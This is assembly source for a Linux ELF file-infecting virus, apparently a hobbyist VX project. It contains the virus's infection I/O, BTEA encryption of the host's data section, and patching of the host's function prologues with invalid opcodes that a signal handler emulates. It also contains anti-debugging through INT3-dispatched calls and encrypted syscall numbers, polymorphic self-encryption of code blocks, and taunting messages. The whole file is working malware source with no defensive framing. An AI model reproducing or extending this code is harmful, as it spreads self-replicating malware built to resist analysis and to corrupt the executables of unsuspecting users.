; Zero variable.
; No Error checks.
ADD_FUNCTION
close:		VIRUS_DEBUG_STRING +close
		BEGIN_EBLOCK_OPCODE
		multipush rdi,rax
		xor	rdi,rdi
		xchg	rdi,[rsi]
		test	rdi,rdi
		jz	.exit
		bp_syscall_al 3		; close
	.exit:	multipop rdi,rax
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[read_from]-----------------------------------------------------------------
; + Seek fd_in to absolute offset r13
; + Read r14 bytes to MALLOC_HANDLE r15
; + Terminate infection on read beginning outside of file.
; + Terminate infection on small/unallocated MALLOC_HANDLE.
; + Terminate infection on read/lseek error. or small/unallocated MALLOC_HANDLE.
; Returns rax = bytes read, ZF if exact amount requested read.
ADD_FUNCTION
read_from:	VIRUS_DEBUG_STRING +read_from
		BEGIN_EBLOCK_OPCODE
		; Save Regs.
		multipush rdi,rsi,rdx,r10
		cmp	r13,[g_statbuf+stat.st_size]
		ja	_terminate_infection
		;
		; Inspect MALLOC_HANDLE
		;
		mov	rsi,[r15+MALLOC_HANDLE.addr]
		test	rsi,rsi
		jz	_terminate_infection
		mov	edx,dword [r15+MALLOC_HANDLE.size]
		cmp	rdx,r14
	.tb0:	jb	_terminate_infection
		;
		; pread64(rdi = fd_in, rsi already *buf, count=r14, off=r13)
		;
		mov	rdi,[g_fd_in]
		mov	rdx,r14
		mov	r10,r13
		bp_syscall_al 17	; pread64
		jb	.tb0
		; Restore Regs.
		multipop rdi,rsi,rdx,r10
		; Set ZF on exact read.
		CHECK_BREAKPOINT
		cmp	rax,r14
		END_EBLOCK_OPCODE
		ret

;-[write_to]------------------------------------------------------------------
; + Write r14 bytes from MALLOC_HANDLE r15 to fd_out.
; + Terminate infection on error or small/unallocated MALLOC_HANDLE.
; + Returns rax = bytes written, ZF if exact amount requested written.
ADD_FUNCTION
write_to:	VIRUS_DEBUG_STRING +write_to
		BEGIN_EBLOCK_OPCODE
		; Save Regs.
		multipush rsi,rdi,rdx
		;
		; Inspect MALLOC_HANDLE
		;
		mov	rsi,[r15+MALLOC_HANDLE.addr]
		test	rsi,rsi
		jz	_terminate_infection
		mov	eax,[r15+MALLOC_HANDLE.size]
		cmp	rax,r14
	.tb0:	jb	_terminate_infection
		;
		; write(fd_out, rsi already *buf, count=r14)
		;
		mov	rdi,[g_fd_out]
		mov	rdx,r14
		bp_syscall_al 1		; write
		jb	.tb0
		multipop rsi,rdi,rdx
		; Set ZF on exact write.
		CHECK_BREAKPOINT
		cmp	rax,r14
		END_EBLOCK_OPCODE
		ret

;-[seek_align]----------------------------------------------------------------
; + Seek fd_out from EOF to next r15 aligned boundary.
; + Terminate infection on error.
; + Returns new offset in rax.
ADD_FUNCTION
seek_align:	VIRUS_DEBUG_STRING +seek_align
		BEGIN_EBLOCK_OPCODE
		; Save Regs.
		multipush rdi,rsi,rdx
		;
		; Get Current Postion.
		;
		; lseek(fd_out,0,SEEK_END)
		mov	rdi,[g_fd_out]
		xor	rsi,rsi
		push	SEEK_END
		pop	rdx
		bp_syscall_al 8	; lseek
	.tb0:	jb	_terminate_infection
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		cmp	r15,1
		jbe	.no_align
		;
		; Align rax to r15, testing values.
		;
		cqo
		div	r15
		test	rdx,rdx
		jz	.noinc
		inc	rax
	.noinc:	mul	r15
		;
		; Seek to aligned value.
		;
		; lseek(fd_out,rax,SEEK_SET)
	.no_align:
		push	rax
		pop	rsi
		xor	dl,dl	; SEEK_SET
		bp_syscall_al 8	; lseek
		jb	_terminate_infection
		; Restore Regs.
	.exit:	multipop rdi,rsi,rdx
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[_bp_syscall_al]--------------------------------------------------------------
; Performs syscall in al/ax - use bp_syscall_al/_syscall_al/ax macro
; Returns CF on Error.
ADD_FUNCTION
__syscall_al:	xor	ah,ah
__syscall_ax:	BEGIN_EBLOCK
		multipush rcx,r11	; Save Regs clobbered by kernel.
		xor	al,0x55		; Decrypt AL
		rol	al,3
		movzx	rax,ax		; Make the Call.
		syscall
		cmp	rax,-4095	; Return CF on Error.
		cmc
		multipop rcx,r11	; Restore Regs.
		END_EBLOCK
		retn

;-[strhash32]-----------------------------------------------------------------
; Returns 32-bit hash of asciiz string.
; Use lstrhash32 macro to load hash value into strhash32_val.
ADD_FUNCTION
strhash32:	BEGIN_EBLOCK_OPCODE

		push	rdx
		push	rsi
		xor	rax,rax
		cqo
	.lup:	lodsb
		test	al,al
		jz	.done
			imul	edx,edx,strhash32_mul
			add	edx,eax
		jmp	.lup
	.done:	xchg	eax,edx
		add	[entropy1],eax
		pop	rsi
		pop	rdx
		END_EBLOCK_OPCODE
		ret

;-[gen_CRC32_table]-----------------------------------------------------------
; Generate CRC32 Lookup table if not already generated.
ADD_FUNCTION
gen_CRC32_table:cmp	qword [g_CRC32_Handle+MALLOC_HANDLE.addr],0
		jne	.exit
		BEGIN_EBLOCK
		call	_pusha
		lea	r15,[g_CRC32_Handle]
		mov	ebx,1024
		call malloc
		push	rax
		pop	rdi
		xor	ebx,ebx
	.dword_loop:	push	rbx
			pop	rax
			push	8
			pop	rcx
		.bit_loop:	shr	eax,1
				jnc	.no_xor
				xor	eax,CRC32_POLY
			.no_xor:loop	.bit_loop
			stosd
			inc	bl
			jnz	.dword_loop
		call	_popa
		END_EBLOCK
	.exit:	ret

;-[CRC32]---------------------------------------------------------------------
; Set CRC32 (EDX) of RCX bytes at RSI
ADD_FUNCTION
CRC32:		;VIRUS_DEBUG_STRING +CRC32
		BEGIN_EBLOCK
		multipush rax,rbx,rcx,rsi
		cld
		call gen_CRC32_table
		mov	rbx,[g_CRC32_Handle+MALLOC_HANDLE.addr]
		not	edx
		xor	rax,rax
		.loop:	lodsb
			xor	al,dl
			shr	edx,8
			xor	edx,[rbx+(rax*4)]
			loop	.loop
		not	edx
		xor	[entropy2],edx
		multipop rax,rbx,rcx,rsi
		END_EBLOCK
		;VIRUS_DEBUG_STRING -CRC32
		ret

;-[rand]----------------------------------------------------------------------
; Return (0 .. RAX-1), flags set on rax|0.
; RAX = 0 for full 64-bit range.
ADD_FUNCTION
rand_prob:	push	rax
		push	rdx
		INT3_CALL rand_any
		add	[entropy1+1],eax
		; no SAHF on some x64 CPUs!
		and	ax,RAND_FLAGS_MASK
		pushf
		pop	rdx
		and	dx,~(RAND_FLAGS_MASK|bit(8))	; clear TF aswell
		or	dx,ax
		push	rdx
		popf
		pop	rdx
		pop	rax
		ret

%define	rand_var(x) (x - g_rand_seeds)

ADD_FUNCTION
rand_any:	xor	al,al
rand_al:	xor	ah,ah
rand_ax:	movzx	rax,ax
rand:		multipush rbx,rcx,rdx,rsi,rdi,rbp,r8,r11
		push	rax

;VIRUS_DEBUG_STRING +rand
; WELL512a Pseudo-RNG
; 512 bit state, 64-bit output.
; Compiled with MSVC++ 2012 then hand-optimized.
lea     rdi, [STATE]
mov     edx, [rdi-STATE + state_i]
mov     ecx, [rdi+rdx*4]
lea     ebx, [rdx-1]
lea     eax, [rdx-3]
mov     r8d, edx
and     eax, 0Fh
mov     r11d, ebx
lea     rbp, [rcx+rcx]
and     ebx, 0Fh
and     r11d, 0Fh
xor     ebp, [rdi+rax*4]
mov     esi, [rdi+r11*4]
mov     [rdi-STATE + state_i], ebx
shl     ebp, 0Fh
xor     ebp, [rdi+rax*4]
lea     eax, [rdx-7]
and     eax, 0Fh
xor     ebp, ecx
mov     edx, [rdi+rax*4]
shr     edx, 0Bh
xor     edx, [rdi+rax*4]
mov     ecx, edx
shl     edx, 0Ah
xor     edx, ebp
xor     ecx, ebp
shl     edx, 0Dh
mov     [rdi+r8*4], ecx
mov     eax, ecx
and     eax, 0FED22169h
xor     edx, eax
shl     edx, 3
xor     edx, esi
shl     edx, 2
xor     edx, ecx
xor     edx, ebp
xor     edx, esi
mov     [rdi+r11*4], edx
mov     rax, [rdi+rbx*4]


		;
		; Do mod for range.
		;
		pop	rcx
		jrcxz	.no_mod
			xor	rdx,rdx
			div	rcx
			xchg	rdx,rax
	.no_mod:test	rax,rax
		multipop rbx,rcx,rdx,rsi,rdi,rbp,r8,r11
		;VIRUS_DEBUG_STRING -rand
		ret

;-[create_tmp_ext]------------------------------------------------------------
; Create temporary file extension.
; Form '.'+ <6 to 3 uppercase/lowercase letters> + \0
ADD_FUNCTION
create_tmp_ext:	BEGIN_EBLOCK_OPCODE
		multipush rax,rcx,rbx
		mov	al,8
		INT3_CALL rand_al
		xchg	ecx,eax
		shl	cl,3
		mov	rbx,'abcdefgh'
		rol	rbx,cl
		INT3_CALL rand_any
		mov	rcx,0x0f0f0f0f0f0f0f0f
		and	rcx,rax
		add	rbx,rcx
		INT3_CALL rand_any
		mov	rcx,0x2020202020202020
		and	rcx,rax
		xor	rbx,rcx
		mov	al,3
		INT3_CALL rand_al
		inc	eax
		xchg	ecx,eax
		shl	cl,3
		shr	rbx,cl
		mov	bl,'.'
		mov	[g_tmp_ext],rbx
		multipop rax,rcx,rbx

		END_EBLOCK_OPCODE
		ret

;-[rand_init]-----------------------------------------------------------------
; initialise prng seeds and xxtea key from virus body
ADD_FUNCTION
rand_init:	VIRUS_DEBUG_STRING +rand_init
		BEGIN_EBLOCK
		multipush rdi,rsi,rax,rdx,rcx
		and	dword [state_i],0
		lea	rdi,[STATE]
		lea	rsi,[virus_start]
		xor	rdx,rdx
		mov	rcx,state_i - virus_start
	.vl:		lodsb
			adc	[rdi+rdx],al
			jc	.s1
			rol	al,cl
		.s1:	inc	dl
			and	dl,63
			loop	.vl
		mov	cl,150
	.warmup:	call	rand_any
			loop	.warmup
		%if RETAL_BTEA_DATA == RETAL_ENABLED
		lea	rdi,[g_btea_enc_key]
		call rand_any
		stosq
		call rand_any
		stosq
		%endif
		multipop rdi,rsi,rax,rdx,rcx
		END_EBLOCK
		VIRUS_DEBUG_STRING -rand_init
		ret

;-[bzero]---------------------------------------------------------------------
; Fill buffer with 00h
; RCX = Size in DWORDs.
; RDI = Buffer
ADD_FUNCTION
bzero:		multipush rax,rcx,rdi
		xor	eax,eax
		rep	stosd
		multipop rax,rcx,rdi

		ret

;-[time_null]-----------------------------------------------------------------
; time(null) - return current time in seconds in rax
time_null:	VIRUS_DEBUG_STRING +time_null
		BEGIN_EBLOCK_OPCODE
		push	rdi
		xor	rdi,rdi
		bp_syscall_al 201	; time
		add	[entropy1+2],eax
		pop	rdi
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

%if RETAL_BTEA_DATA == RETAL_ENABLED
;-[btea_dec]------------------------------------------------------------------
; NC = fork to _btea_dec
btea_dec:	db	0xA8	; test al

;-[btea_enc]------------------------------------------------------------------
; CF = fork to _btea_enc
btea_enc:	stc

;-[btea routines]-------------------------------------------------------------
ADD_FUNCTION
		BEGIN_EBLOCK	;_OPCODE

		call	_pusha
		jc	_btea_enc
		jmp	_btea_dec
;-[btea_MX]-------------------------------------------------------------------
; (z>>5 ^ y<<2) + (y>>3 ^ z<<4) ^ ((sum ^ y)+k[p&3^e] ^ z)
;output : ebp.
; ecx,edx = tmp
btea_MX:	multipush rcx,rdx

		; (z>>5 ^ y<<2)
		mov	edx,esi
		shr	edx,5
		mov	ecx,edi
		shl	ecx,2
		xor	edx,ecx
		; (y>>3 ^ z<<4)
		mov	ebp,edi
		shr	ebp,3
		mov	ecx,esi
		shl	ecx,4
		xor	ebp,ecx
		add	ebp,edx		; (z>>5 ^ y<<2) + (y>>3 ^ z<<4)
		; (sum ^ y)
		mov	edx,eax
		xor	edx,edi
		; k[p&3^e]^z
		mov	rcx,r8
		xor	ecx,ebx
		and	rcx,3
		mov	ecx,[(rcx*4)+r14]
		xor	ecx,esi
		add	ecx,edx
		xor	ebp,ecx

		multipop rcx,rdx
		ret

;-[btea_return]---------------------------------------------------------------
btea_return:	call	_popa
		END_EBLOCK	;_OPCODE
		VIRUS_DEBUG_STRING *btea_return
		CHECK_BREAKPOINT
		ret

;-[_btea_dec]-----------------------------------------------------------------
; BTEA Encrypt/Decrypt host .data section.
ADD_FUNCTION
_btea_dec:	BEGIN_EBLOCK	;_OPCODE
		; *v = r15 = exe_data_addr
		; *k = r14 = exe_btea_dec_key
		; ecx = n
		; eax = sum
		; ebx = e
		; r8 = p
		; esi = z
		; edi = y

		lea	r14,[exe_btea_dec_key]
		mov	r15,[exe_data_addr]
		test	r15,r15
		jz	.jz_exit0
		mov	ecx,[exe_data_size]
		shr	ecx,2
	.jz_exit0:
		jz	.exit
		; y=v[0]
		mov	edi,[r15]
		; q = 6 + 52/n;
		; sum = q*delta
		push	52
		pop	rax
		cqo
		idiv	ecx
		add	eax,6
		imul	eax,eax,BTEA_DELTA
	.sum_lup:
		; while (sum != 0)
		test	eax,eax
		jz	.end_sum_loop
			; e = ( sum >> 2) & 3
			mov	ebx,eax
			shr	ebx,2
			and	ebx,3
			; for(p=n-1; p>0; p--)
			lea	r8,[rcx-1]
		.p_lup:	cmp	r8,0
			jle	.end_p_lup
				; z = v[p-1]
				mov	esi,[r15+(r8*4)-4]
				; y = v[p] -= MX
				call	btea_MX
				sub	[r15+(r8*4)],ebp
				mov	edi,[r15+(r8*4)]
			dec	r8
			jmp	.p_lup
		.end_p_lup:
		; z = v[n-1]
		mov	esi,[r15+(rcx*4)-4]
		; y = v[0] -= MX;
		call	btea_MX
		sub	[r15],ebp
		mov	edi,[r15]
		; sum -= delta
		sub	eax,BTEA_DELTA
	jmp	.sum_lup
	.end_sum_loop:
		END_EBLOCK	;_OPCODE
	.exit:	jmp	btea_return

;-[_btea_enc]-----------------------------------------------------------------
; BTEA Encrypt host .data section.
ADD_FUNCTION
_btea_enc:	BEGIN_EBLOCK	;_OPCODE
		; *v = r15 = .data section image ptr
		; *k = r14 = g_btea_enc_key
		; ecx = n
		; eax = sum
		; ebx = e
		; r8 = p
		; esi = z
		; edi = y
		; edx = q

		lea	r14,[g_btea_enc_key]
		mov	ecx,[g_data_index]
		call get_section_by_index
		mov	r15,[r15+MALLOC_HANDLE.addr]
		mov	ecx,[rbx+Elf64_Shdr.sh_size]
		shr	ecx,2
		jz	.exit
		; y=v[0]
		mov	edi,[r15]
		; q = 6 + 52/n;
		; sum = 0
		push	52
		pop	rax
		cqo
		idiv	ecx
		add	eax,6
		xchg	edx,eax
		xor	eax,eax
	.sum_lup:
		; while (q-- > 0)
		cmp	edx,0
		jle	.exit
		dec	edx
			; sum += delta
			add	eax,BTEA_DELTA
			; e = ( sum >> 2) & 3
			mov	ebx,eax
			shr	ebx,2
			and	ebx,3
			; for(p=0; p<n-1; p++)
			xor	r8,r8
		.p_lup:	lea	rbp,[rcx-1]
			cmp	r8,rbp
			jge	.end_p_lup
				; y = v[p+1];
				mov	edi,[r15+(r8*4)+4]
				; z = v[p] += MX
				call	btea_MX
				add	[r15+(r8*4)],ebp
				mov	esi,[r15+(r8*4)]
			inc	r8
			jmp	.p_lup
		.end_p_lup:
		; y = v[0]
		mov	edi,[r15]
		; z = v[n-1] += MX
		call	btea_MX
		add	[r15+(rcx*4)-4],ebp
		mov	esi,[r15+(rcx*4)-4]
	jmp	.sum_lup
	.exit:	END_EBLOCK	;_OPCODE
		jmp	_btea_dec.exit

%endif


%if RETAL_PATCH_EXE_TEXT == RETAL_ENABLED
;-[create_invalid_opcode]-----------------------------------------------------
; return ax == invalid opcode.
ADD_FUNCTION
create_invalid_opcode:
		BEGIN_EBLOCK_OPCODE

		INT3_CALL rand_any
		xchg	eax,ebx
		mov	al,4
		call	rand_al
		jnz	.r0
		mov	ax,0xFEFE
		or	eax,ebx
		jmp	.ret1
	.r0:	dec	eax
		jnz	.r1
		mov	ah,0xC0
		or	ah,bh
		mov	al,0x8D
	.ret1:	jmp	.ret2
	.r1:	dec	eax
		jnz	.r2
		call	.p1
			db 0x06, 0x07, 0x0E, 0x16, 0x17		; 5
			db 0x1E, 0x1F, 0x37, 0x3F, 0x37		; 10
			db 0x3F, 0x60, 0x61, 0x62, 0x82		; 15
			db 0x9A, 0xC4, 0xC5, 0xD4, 0xD5		; 20
			db 0xD6, 0xEA				; 22
			db 0x1E, 0x1F, 0x17, 0x1F, 0x37		; 27
			db 0x3F, 0x60, 0x61, 0x62, 0x82		; 32

	.p1:	pop	r15
		mov	ah,bh
		and	rbx,0x1F
		mov	al,[r15+rbx]
	.ret2:	jmp	.s1
	.r2:	xchg	eax,ebx
		and	al,1
		or	al,0xC6
		test	ah,0x38
		jnz	.s1
		or	ah,8
	.s1:	END_EBLOCK_OPCODE
		ret

;-[patch_text_prologs]--------------------------------------------------------
; replace push rbp | mov rbp,rsp with invalid opcode.
; do the same with cmp rax,-1
ADD_FUNCTION
patch_text_prologs:
		VIRUS_DEBUG_STRING +patch_text_prologs
		BEGIN_EBLOCK_OPCODE
		multipush rcx,rsi,rbx,r15
		mov	ecx,[g_text_index]
		INT3_CALL get_section_by_index
		mov	rsi,[r15+MALLOC_HANDLE.addr]
		mov	rcx,[rbx+Elf64_Shdr.sh_size]
		sub	rcx,8
		jbe	.exit
	.l:		mov	rdx,[g_exe_prolog_patch_sum]
			cmp	dword [rsi],PROLOG_PATCH_1
			je	.do_patch
			cmp	dword [rsi],CMP_RAX_PATCH
			jne	.next
			shr	rdx,16
		.do_patch:
			INT3_CALL create_invalid_opcode
			mov	[rsi],ax
			xor	ax,dx
			mov	[rsi+2],ax
	.next:	inc	rsi
		loop	.l
	.exit:	multipop rcx,rsi,rbx,r15
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[emulate_rbp_prolog]--------------------------------------------------------
; emulate push rbp | mov rbp,rsp.
ADD_FUNCTION
emulate_rbp_prolog:
		BEGIN_EBLOCK_OPCODE
		push	rbp
		mov	rbp,rsp
		END_EBLOCK_OPCODE
		jmp	emulate_cmp_rax.j


;-[emulate_cmp_rax]-----------------------------------------------------------
; emulate cmp rax,-1
ADD_FUNCTION
emulate_cmp_rax:cmp	rax,-1
	.j:	jmp	[g_patched_prolog_rip]
%endif
;-[complete_int3_call]--------------------------------------------------------
; carry out call made using int3, handle by SIGTRAP_HANDLER
ADD_FUNCTION
complete_int3_call:
		push	qword [g_int3_call_return]
		;jmp	emulate_cmp_rax.j
		jmp	[g_patched_prolog_rip]

;-[complete_bpice_syscall]----------------------------------------------------
; carry out syscall made using bpice + imm8
ADD_FUNCTION
complete_bpice_syscall:
		push	qword [g_int3_call_return]
		jmp	__syscall_al

;-[complete_eblock_entry_opcode]----------------------------------------------
; carry out eblock_entry made with invalide opcode
%if RETAL_EBLOCKS == RETAL_ENABLED
ADD_FUNCTION
complete_eblock_entry_opcode:
		push	qword [g_int3_call_return]
		jmp	enter_eblock

;-[complete_eblock_exit_opcode]-----------------------------------------------
; carry out eblock_exit made with invalide opcode
ADD_FUNCTION
complete_eblock_exit_opcode:
		push	qword [g_int3_call_return]
		jmp	exit_eblock
%endif

;-[ill_signal_handler]--------------------------------------------------------
; signal handler to handle function prologs patched to invalid opcode.
; rdi = signal number
; rsi = siginfo struc
; rdx = sigcontext
%if (RETAL_PATCH_EXE_TEXT == RETAL_ENABLED) || (RETAL_EBLOCK_OPCODE == RETAL_ENABLED)
ADD_FUNCTION
ill_signal_handler:
		BEGIN_EBLOCK
		cld
		mov	rsi,[rdx+ucontext.uc_mcontext+sigcontext.rip]
		lea	rax,[virus_p_end]
		sub	rax,rsi
		cmp	rax,virus_p_size
		ja	.try_exe_inv
%if RETAL_EBLOCKS == RETAL_ENABLED
		lodsb
		cmp	al,ENTER_EBLOCK_OPCODE
		jne	.try_eblock_exit
		; eblock enter
		lea	rax,[complete_eblock_entry_opcode]
		jmp	.do_eblock
	.try_eblock_exit:
		cmp	al,EXIT_EBLOCK_OPCODE
		jne	.error
		lea	rax,[complete_eblock_exit_opcode]
	.do_eblock:
		mov	[g_int3_call_return],rsi
		mov	[rdx+ucontext.uc_mcontext+sigcontext.rip],rax
%endif
		jmp	.exit
	.try_exe_inv:
		cmp	dword [exe_data_size],-1
		je	.error
		mov	eax,[rsi]
		shld	ebx,eax,16
		xor	eax,ebx
		lea	rdi,[emulate_rbp_prolog]
		mov	ecx,[exe_prolog_patch_sum]
		cmp	ax,cx 	; [exe_prolog_patch_sum]
		je	.do_rdi
		add	rdi,emulate_cmp_rax - emulate_rbp_prolog
		shr	ecx,16
		cmp	ax,cx	; [exe_cmp_rax_patch_sum]
		jne	.error
	.do_rdi:xchg	rdi,[rdx+ucontext.uc_mcontext+sigcontext.rip]
		add	rdi,4
		mov	[g_patched_prolog_rip],rdi
	.exit:	END_EBLOCK
		ret

	.error:	call	negstr_exit
		negstr	""
		negstr	"Illegal Instruction. But what really is 'Illegal'?"
		negstr	"Look at vxheavens.com.."
		negstr	"kidz with ill skillz get harrassed by cops still."
		db	0
%endif
;-[trap_signal_handler]-------------------------------------------------------
; signal handler to handle calls made using INT3 (0xCC).
ADD_FUNCTION
%if RETAL_INT3_CALLS == RETAL_ENABLED || RETAL_BP_SYSCALLS == RETAL_ENABLED
trap_signal_handler:
		BEGIN_EBLOCK
		cld
		mov	rsi,[rdx+ucontext.uc_mcontext+sigcontext.rip]
		lea	rax,[virus_p_end]
		sub	rax,rsi
		cmp	rax,virus_p_size
		ja	.error
		cmp	byte [rsi-1],0xCC
		je	.cc
		cmp	byte [rsi-1],0xF1
		je	.f1
		inc	rsi
		cmp	byte [rsi-1],0xCC
		je	.cc
		cmp	byte [rsi-1],0xF1
		jne	.error
	.f1:	lodsb
		neg	al
		mov	[rdx+ucontext.uc_mcontext+sigcontext.rax],al
		mov	[g_int3_call_return],rsi
		lea	rax,[complete_bpice_syscall]
		jmp	.exit
	.cc:	lodsw
		mov	[g_int3_call_return],rsi
		xor	ax,INT3_ADDR_MASK
		movsx	rax,ax
		add	rsi,rax
		mov	[g_patched_prolog_rip],rsi
		lea	rax,[complete_int3_call]
	.exit:	mov	[rdx+ucontext.uc_mcontext+sigcontext.rip],rax
		END_EBLOCK
		ret

	.error:	call	negstr_exit
		negstr	""
		negstr	"Break Me, Break it and Break it again."
		db	0
%endif

;%if 0
;-[signal_restorer]-----------------------------------------------------------
; required by sigaction.
ADD_FUNCTION
signal_restorer:xor	rdi,rdi
		push	15	; sigreturn
		pop	rax
		syscall

;-[install_signal_handler]----------------------------------------------------
; install signal handler to handle patched function prologs.
; rax = handler, rdi = signal number, rdx = signal mask
ADD_FUNCTION
install_signal_handler:
		BEGIN_EBLOCK

		call	_pusha
		lea	rsi,[g_sa]	; act
		mov	qword [rsi+sigaction.sa_handler],rax
		mov	qword [rsi+sigaction.sa_flags],SA_RESTORER
		lea	rax,[signal_restorer]
		mov	qword [rsi+sigaction.sa_restorer],rax
		mov	qword [rsi+sigaction.sa_mask],rdx	;1 << (SIGILL - 1)
		xor	rdx,rdx		; oldact
		push	8
		pop	r10		; sizeof sa_mask
		_syscall_al 13		; _rt_sigaction
		END_EBLOCK
		jnb	.exit
		; error installing sig handler
		call	negstr_exit
		negstr	""
		negstr "Strange signals you have.. very strange ;)"
		db	0
	.exit:	call	_popa
		ret
;%endif
;[decrypt_DA]-----------------------------------------------------------------
; decrypt DA (direct action) string to g_da_buf - return RDI pointing to string
ADD_FUNCTION
decrypt_DA:	pop	rsi
		BEGIN_EBLOCK_OPCODE
		lea	rdi,[g_da_buf]
		push	rdi
	.l:		lodsb
			xor	al,'$'
			stosb
			jnz	.l
		pop	rdi
		END_EBLOCK_OPCODE
		jmp	rsi

;-[print_virus_name_string]---------------------------------------------------
; Display virus copyright message.
ADD_FUNCTION
print_virus_name_string:
		BEGIN_EBLOCK
		lea	rsi,[virus_name_neg_string]
		call	negstr_print
		END_EBLOCK
		ret

virus_name_neg_string:
		db	-NEWLINE
		negstr	VIRUS_NAME_STRING
		db	0

;-[negstr_exit]---------------------------------------------------------------
; Display NEG encrypted string pointed to by stack top, exit with error code
; 42.
ADD_FUNCTION
negstr_exit:	BEGIN_EBLOCK
		mov	al,5
		call	rand_al
		jnz	.no_virus_name_string
		call	print_virus_name_string
	.no_virus_name_string:
		pop	rsi
		call	negstr_print
		; exit(42)
		push	42
		pop	rdi
		_syscall_al 231	; exit_group
		END_EBLOCK

;-[negstr_print]--------------------------------------------------------------
; Print NEG encrypted string with pointed to by RSI
ADD_FUNCTION
negstr_print:	BEGIN_EBLOCK
		cld
		mov	rbp,rsp
		sub	rsp,1024
		mov	rdi,rsp
		push	-1
		pop	rdx
		push	rdi
	.negstrlup:	lodsb
			neg	al
			stosb
			inc	edx
			jc	.negstrlup
		pop	rsi
		push	STDOUT
		pop	rdi
		_syscall_al 1	; write
		mov	rsp,rbp
		END_EBLOCK
		ret

;-[zf_if_ofile]---------------------------------------------------------------
; return zf if file type is 'o'
zf_if_ofile:	cmp	byte [g_file_type],'o'
		ret

;-[pusha/popa]----------------------------------------------------------------
; push/pop all registers.. 5 bytes call is less than series of push/pops
ADD_FUNCTION
_pusha:
		pop	qword [g_pusha_popa_return]
		pushfq
		multipush rax,rbx,rcx,rdx,rbp,rsi,rdi,r8,r9,r10,r11,r12,r13,r14,r15
	.jmpret:
		jmp	qword [g_pusha_popa_return]
ADD_FUNCTION
_popa:
		pop	qword [g_pusha_popa_return]
		multipop rax,rbx,rcx,rdx,rbp,rsi,rdi,r8,r9,r10,r11,r12,r13,r14,r15
		popfq
		jmp	_pusha.jmpret


;-[j_eblock_crypt]------------------------------------------------------------
j_eblock_crypt:	call	_pusha
		jmp	eblock_crypt

;-[enter_eblock]--------------------------------------------------------------
; decrypt and enter encrypted block.
%if RETAL_EBLOCKS == RETAL_ENABLED
ADD_FUNCTION
enter_eblock:	call	_pusha
		cld
		mov	rsi,[rsp+PUSHA_STACK_size]		  	; Get return RIP
		add	qword [rsp+PUSHA_STACK_size],EBLOCK_HANDLE_size ; Set return RIP
		mov	edi,[g_EBLOCK_index]
		lea	rbx,[g_EBLOCK_STACK]
		mov	[rbx+(rdi*8)],rsi
		inc	dword [g_EBLOCK_index]
		inc	byte [rsi]
		lodsb
		cmp	al,1
		je	exit_eblock.cont
	.exit:	call	_popa
		ret


;-[exit_eblock]---------------------------------------------------------------
; exit and encrypt decrypted block.
ADD_FUNCTION
exit_eblock:	call	_pusha
		cld
		dec	dword [g_EBLOCK_index]
		mov	edi,[g_EBLOCK_index]
		lea	rbx,[g_EBLOCK_STACK]
		mov	rsi,[rbx+(rdi*8)]
		dec	byte [rsi]
		lodsb
		test	al,al
		jnz	enter_eblock.exit
		call	rand_any
		mov	[rsi+EBLOCK_HANDLE.key-1],eax
	.cont:	lodsd
		xchg	edx,eax	; key
		xor	eax,eax
		lodsw
		xchg	eax,ecx	; size
		; continues on to eblock_crypt
%endif
;-[eblock_crypt]--------------------------------------------------------------
; generate polymorphic routine and decrypt/encrypt EBLOCK.
; cx = count, edx = key, rsi = offset.
ADD_FUNCTION
eblock_crypt:	lea	rdi,[.crypt_code]
		lea	r8,[(rdi-.crypt_code)+eblock_crypt_ops]
		push	rcx
		mov	bl,10
	.op_loop:	mov	ecx,edx
			and	ecx,(31 << 1)
			mov	eax,[r8+rcx]
			neg	ax
			sub	ah,cl
			sbb	al,cl
			stosw
			imul	edx,1664525
			add	edx,1013904223
			dec	bl
			jnz	.op_loop
		pop	rcx
		push	rsi
		pop	rdi
%if RETAL_BREAKPOINT_CHECK == RETAL_ENABLED
		lea	rbp,[check_breakpoint]
		xor	rbx,rbx
%endif
	.crypt_code:	times 10 dw 0		; dh/dl = keymod/key
			lodsd
%if RETAL_BREAKPOINT_CHECK == RETAL_ENABLED
			add	edx,[rbp+rbx]
%endif
			xor	eax,edx
			stosd
%if RETAL_BREAKPOINT_CHECK == RETAL_ENABLED
			inc	ebx
			cmp	ebx,_SIZE - 3
			jb	.bps
			xor	ebx,ebx
		.bps:
%endif
			add	[entropy1+2],edx
			jnc	.ne
			rol	qword [entropy1],cl
		.ne:	sub	ecx,4
			cmp	ecx,4
			jae	.crypt_code
			shr	ecx,1
			jnc	.no_b
				lodsb
				xor	al,dl
				stosb
		.no_b:	shr	rcx,1
			jnc	.no_w
				lodsd
				xor	eax,edx
				stosw
	.no_w:	call	_popa
		ret
;-;eblock_crypt_ops]----------------------------------------------------------
; operations for eblock encryption/decryption (Encrypted by dropper)
; dl = key, dh = key mod, cx (cl) = count
eblock_crypt_ops:	rol	dl,1	; 00
			rol	dh,1	; 01
			rol	edx,1	; 02
			rol	dl,cl	; 03
			rol	dh,cl	; 04
			rol	edx,cl	; 05
			add	dl,cl	; 06
			sub	dl,cl	; 07
			xor	dl,cl	; 08
			add	dh,cl	; 09
			sub	dh,cl	; 10
			xor	dl,cl	; 11
			add	edx,ecx	; 12
			sub	edx,ecx	; 13
			xor	edx,ecx	; 14
			bswap	edx	; 15
			mov	dl,dl	; 16 - NOP
			add	dl,dh	; 17
			sub	dl,dh	; 18
			xor	dl,dh	; 19
			not	dl	; 20
			not	dh	; 21
			not	edx	; 22
			neg	dl	; 23
			neg	dh	; 24
			neg	edx	; 25
			inc	dl	; 26
			inc	dh	; 27
			inc	edx	; 28
			rol	edx,cl	; 29
			add	edx,ecx	; 30
			bswap	edx	; 31
%if ($ - eblock_crypt_ops) != 64
	%error eblock_crypt_ops should be 64 bytes.
%endif

;-[RDA_Encode]----------------------------------------------------------------
; Encode RCX bytes at RSI using Random Decoding Algorithm, optionaly setting crc32.
ADD_FUNCTION
RDA_Encode:	db	0xA8	; test al
RDA_Encode_CRC:	stc
		VIRUS_DEBUG_STRING +RDA_Encode
		BEGIN_EBLOCK
		jnc	.no_crc
		push	rdx
		xor	edx,edx
		call	CRC32
		mov	[rsi+rcx],edx
		pop	rdx
	.no_crc:call	_pusha
		call	rand_any
		movzx	edx,ax
		and	dh,RDA_HIGH_BYTE
		call	j_eblock_crypt
		call	_popa
